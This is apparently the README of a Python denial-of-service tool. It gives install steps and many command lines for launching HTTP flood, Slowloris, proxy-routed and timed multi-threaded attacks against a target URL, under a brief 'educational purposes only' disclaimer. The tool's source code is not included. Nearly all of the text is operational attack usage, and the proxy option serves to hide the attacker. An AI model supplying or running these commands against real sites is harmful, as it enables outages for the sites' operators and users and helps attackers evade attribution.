# Advanced DDoS Tool - Command Line Version

## ⚠️ LEGAL DISCLAIMER
This tool is for **educational and authorized security testing purposes ONLY**. Unauthorized use against any system without explicit written permission is **ILLEGAL** and may result in severe criminal penalties. The authors are not responsible for any misuse of this tool.

## Installation

### Prerequisites
- Python 3.6 or higher
- pip3

### Setup Instructions

1. **Clone the repository**
   ```bash
   git clone https://github.com/dmon56460-oss/Ethicial.git
   cd Ethicial
   pip3 install -r requirements.txt
   python3 DDos_V1.py --url <target_url> [options]
   # Basic HTTP Flood Attack
python DDos_V1.py --url https://example.com --mode http --threads 50

# Slowloris Attack with Custom Port
python DDos_V1.py --url https://example.com --port 8080 --mode slowloris

# Attack with Proxies and Rate Control
python DDos_V1.py --url https://example.com --proxy proxies.txt --rate 20

# Timed Attack (30 seconds)
python DDos_V1.py --url https://example.com --duration 30 --threads 100

# Verbose Mode with Custom Settings
python DDos_V1.py --url https://example.com --port 443 --mode http --threads 50 --rate 25 --timeout 3 --verbose

# Attack on specific port
python DDos_V1.py --url https://example.com --port 8080 --threads 30

# Full attack with all options
python DDos_V1.py --url https://example.com --port 80 --mode http --threads 100 --rate 30 --timeout 5 --duration 60 --proxy proxies.txt --verbose
